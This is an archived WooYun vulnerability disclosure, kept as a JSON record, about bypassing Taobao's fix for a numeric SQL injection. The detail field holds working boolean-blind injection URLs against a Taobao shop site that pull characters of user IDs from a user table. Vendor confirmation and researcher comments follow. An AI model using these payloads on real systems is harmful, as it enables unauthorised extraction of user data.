{"id": 45252, "wybug_id": "wooyun-2015-096830", "wybug_title": "淘宝SQL注入修复绕过", "wybug_corp": "淘宝网", "wybug_author": "he1renyagao", "wybug_date": "2015-02-11 17:54", "wybug_open_date": "2015-03-28 17:56", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-28：\t细节向公众公开  简要描述： 淘宝修复注入的方式居然不是修改原代码。。。。  详细说明：  原来的注入语句是：(SELECT+(CASE+WHEN+(3373=3373)+THEN+(21+and+1=1)+ELSE+1/(SELECT+0)+END))   and 1=1绕过语句（select 1 and 1=1）  即 and 1=1  －－状态值200（select 1 and 1=2）  即 and 1=2  －－状态值302\n\n其他跑数据的方式  依然使用上一次的方法这次对数据分析了下，一些产品，价格，之类的item 是真实存在的。但是对user 这个表，数据一直不完整，有在怀疑这个表是你们故意做的蜜罐表利用 http://pinliu.uz.taobao.com/   站点，为什么利用这个站点呢，原因如下http://pinliu.uz.taobao.com/theme/tejia/view/view_article.php?id=(select%201%20and%20subString((select%20uid%20from%20user%20limit%201,1),1,1)=0)  网页显示正常，文章内容显示正常。\n\n而当访问http://pinliu.uz.taobao.com/theme/tejia/view/view_article.php?id=(select%201%20and%20subString((select%20uid%20from%20user%20limit%201,1),1,1)=1)网页显示正常，文章内容显示不正常。\n\n也就是第一个用户的uid 的第一个字符为0如果用其他站点则没有这个效果，不清楚具体内部逻辑是说明，为什么会造成这差异以此方法跑了下数据 得到and%20subString((select%20uid%20from%20user%20limit%201610,1),1,1)=0   大概有  1610人   uid 以 0 开头and%20subString((select%20uid%20from%20user%20limit%201611,1),1,1)=1and%20subString((select%20uid%20from%20user%20limit%203289,1),1,1)=1   大概有  3290-1611  uid 以1 开头  1679and%20subString((select%20uid%20from%20user%20limit%203290,1),1,1)=2 and%20subString((select%20uid%20from%20user%20limit%205023,1),1,1)=2    大概有  5024-3290 以2开头   1734and%20subString((select%20uid%20from%20user%20limit%205024,1),1,1)=3and%20subString((select%20uid%20from%20user%20limit%206721,1),1,1)=3   大概有  6722-5024 以3 开头  1698and%20subString((select%20uid%20from%20user%20limit%206722,1),1,1)=4  and%20subString((select%20uid%20from%20user%20limit%208398,1),1,1)=4and%20subString((select%20uid%20from%20user%20limit%208399,1),1,1)=5and%20subString((select%20uid%20from%20user%20limit%2010089,1),1,1)=5and%20subString((select%20uid%20from%20user%20limit%2010090,1),1,1)=6     and%20subString((select%20uid%20from%20user%20limit%2011781,1),1,1)=6and%20subString((select%20uid%20from%20user%20limit%2011782,1),1,1)=7 and%20subString((select%20uid%20from%20user%20limit%2013416,1),1,1)=7and%20subString((select%20uid%20from%20user%20limit%2013417,1),1,1)=8and%20subString((select%20uid%20from%20user%20limit%2015091,1),1,1)=8and%20subString((select%20uid%20from%20user%20limit%2015092,1),1,1)=9 and%20subString((select%20uid%20from%20user%20limit%2016699,1),1,1)=9and%20subString((select%20uid%20from%20user%20limit%2016700,1),1,1)=0      16700 一个循环这个用户表的数据到 26392的时候就没了 修改的地方0-9跑了下，都没有文章内容\n\nhttp://pinliu.uz.taobao.com/theme/tejia/view/view_article.php?id=(select%201%20and%20subString((select%20uid%20from%20user%20limit%2026392,1),1,1)=0)因此猜测这个用户表的数据用户大概能有 26392个。（如果上面的范围有误差，肯定是递增的，也就是 1%20and%20subString((select%20uid%20from%20user%20limit%2010089,1),1,1)=51%20and%20subString((select%20uid%20from%20user%20limit%2010090,1),1,1)=6    会变成1%20and%20subString((select%20uid%20from%20user%20limit%2010090,1),1,1)=51%20and%20subString((select%20uid%20from%20user%20limit%2010091,1),1,1)=6    ）一开始我以为是蜜罐表，但是既然用户量有在增加，就应该不是蜜罐表，从用户量来看，也不是淘宝的一个级别的。会不会这店铺商家的用户呢？ 你觉得呢？ 我是觉得太少，不应该   漏洞证明：  ..   修复方案：  。。。   版权声明：转载请注明来源 he1renyagao@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-02-12 11:41 厂商回复： 亲，感谢您的关注和支持，该漏洞我们正在修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-11 20:44 |    \t\the1renyagao \t\t\t( 普通白帽子  |\t\t\t        Rank:225 漏洞数:29        | 是金子总会发光，在还未发光之前，先打磨打...)\t\t \n  还有其他域名的几个同样的点，忘了提交了 ，到时候私信下。    \n     2015-02-12 11:44 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  我去。。    \n     2015-02-12 12:03 |    \t\t第四维度 \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:34        | 谦谦君子，温润如玉)\t\t \n  看看是怎么绕过的    \n     2015-02-12 12:05 |    \t\tTMaMba \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:7        | )\t\t \n  我去    \n     2015-02-12 12:13 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  @he1renyagao 难道是、    \n     2015-02-12 12:43 |    \t\the1renyagao \t\t\t( 普通白帽子  |\t\t\t        Rank:225 漏洞数:29        | 是金子总会发光，在还未发光之前，先打磨打...)\t\t \n  @黑暗游侠   淘宝一系列网站存在多处SQL注入(存在通用性影响数万店铺)里又获得了2个乌云币   你给的？    \n     2015-02-12 12:46 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  @he1renyagao 我没给，估计别人的哈    \n     2015-02-12 12:47 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  @he1renyagao wooyun币一直很省    \n     2015-02-12 13:11 |    \t\t黑吃黑 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:29        | 倚楼听风雨，淡看江湖路...)\t\t \n  呵呵    \n     2015-02-12 13:46 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  看看是怎么绕过的    \n     2015-02-12 15:32 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  看看是怎么绕过的    \n     2015-02-12 15:57 |    \t\tplane636 \t\t\t( 普通白帽子  |\t\t\t        Rank:160 漏洞数:16        )\t\t \n  难道是用js做过滤？    \n     2015-03-30 15:37 |    \t\tisxenos \t\t\t( 实习白帽子  |\t\t\t        Rank:71 漏洞数:8        | 也好)\t\t \n   U站程序 可以自定义开发的    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}